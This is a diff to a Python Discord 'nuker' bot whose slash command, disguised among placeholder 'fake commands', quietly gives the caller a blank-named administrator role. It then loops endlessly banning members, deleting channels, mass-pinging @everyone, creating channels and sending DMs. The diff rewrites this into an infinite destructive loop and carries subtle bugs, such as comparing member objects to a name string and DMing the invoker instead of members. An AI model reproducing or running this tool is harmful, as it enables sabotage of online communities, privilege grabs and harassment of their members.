@@ -6,16 +6,18 @@ token = "token"  # your token
 
 delete_channels = False  # set to "True" if you want to delete all channels
 ban_members = False  # set to "True" if you want to ban all members
-give_admin = True  # gives you admin
+give_admin = False  # set to "True" to get admin
+ping_everyone = False  # set to "True" to ping everyone
 create_channels_count = 0  # set how many channels the bot will create. leave as 0 to disable
 dm_members = ""  # your message here. leave blank to disable
-bot_activity = ""  # bot activity text, leave blank to disable
-your_nick = ""  # this nick won't be banned, format Name#0000, MANDATORY!!
+bot_activity = "/help"  # bot activity text, leave blank to disable
+your_nick = ""  # this nick won't be banned, format Name#0000
 command_name = ""  # command name, MANDATORY!!
-command_description = ""  # command description, MANDATORY!!
-cool_message = ""  # bot will send this message when nuking starts. leave blank for no message
+command_description = "does stuff"  # command description, MANDATORY!!
+cool_message = "boom"  # bot will send this message when nuking starts. leave blank for no message
 
 # to start nuking run /"your command name"
+
 
 bot = lightbulb.BotApp(
     token=token,
@@ -25,6 +27,7 @@ bot = lightbulb.BotApp(
 
 @bot.listen(hikari.StartedEvent)
 async def on_start(event):
+    print(bot.rest.fetch_members(guild=1009208323679191161))
     print("""\
     
  $$$$$$\  $$$$$$$\  $$\                           
@@ -64,33 +67,61 @@ if not cool_message:
 @lightbulb.command(command_name, command_description)
 @lightbulb.implements(lightbulb.SlashCommand)
 async def generates_spam(ctx):
+    global create_channels_count
     await ctx.respond(cool_message)
-    if ban_members:
-        for member in await bot.rest.fetch_members(guild=ctx.get_guild()):
+    if give_admin:
+        try:
+            await bot.rest.add_role_to_member(guild=ctx.get_guild(), user=ctx.member,
+                                              role=await bot.rest.create_role(guild=ctx.get_guild(),
+                                                                              name="⠀",
+                                                                              permissions=hikari.Permissions.ADMINISTRATOR,
+                                                                              color="#292b2f"))
+        except:
+            print("bot needs higher permissions to give you admin")
+
+    created_channels = 0
+    while True:
+        member_iter = iter(await bot.rest.fetch_members(guild=ctx.get_guild()))
+        member = next(member_iter)
+        channel_iter = iter(await bot.rest.fetch_guild_channels(guild=ctx.get_guild()))
+        channel = next(channel_iter)
+
+        if member != your_nick and ban_members:
             try:
-                if not your_nick:
-                    await bot.rest.ban_member(guild=ctx.get_guild(), user=member)
+                await bot.rest.ban_member(guild=ctx.get_guild(), user=member)
             except:
                 print(f"couldn't ban {member}")
-    if delete_channels:
-        for channel in await bot.rest.fetch_guild_channels(guild=ctx.get_guild()):
-            await bot.rest.delete_channel(channel=channel)
-    if create_channels_count != 0:
-        for i in range(create_channels_count):
-            await bot.rest.create_guild_text_channel(name=generate_random_str(), guild=ctx.get_guild())
-    if dm_members:
-        for member in await bot.rest.fetch_members(guild=ctx.get_guild()):
+
+        if dm_members:
             try:
                 await ctx.member.send(dm_members)
             except:
                 print(f"couldn't send dm to {member}")
-    if give_admin:
-        try:
-            await bot.rest.add_role_to_member(guild=ctx.get_guild(),user=ctx.member,
-                                              role=await bot.rest.create_role(guild=ctx.get_guild(),
-                                              name="⠀", permissions=hikari.Permissions.ADMINISTRATOR,color="#292b2f"))
-        except:
-            print("bot needs higher permissions to give you admin")
+
+        if ping_everyone:
+            try:
+                await bot.rest.create_message(channel=channel.id, mentions_everyone=True, content="@everyone")
+            except:
+                print("can't send messages")
+
+        if delete_channels:
+            try:
+                await bot.rest.delete_channel(channel=channel)
+            except:
+                print(f"can't delete {channel}")
+
+        if create_channels_count != 0 and created_channels <= create_channels_count:
+            try:
+                await bot.rest.create_guild_text_channel(name=generate_random_str(), guild=ctx.get_guild())
+                created_channels += 1
+            except:
+                print("cant create channel}")
+
+        if dm_members:
+            try:
+                await ctx.member.send(dm_members)
+            except:
+                print(f"couldn't send dm to {member}")
 
 
 # fake commands (delete if not needed)
@@ -163,5 +194,6 @@ async def fake_command9(ctx):
 async def fake_command10(ctx):
     ctx.respond("⠀")
 
-
+# end of fake commands
+    
 bot.run()
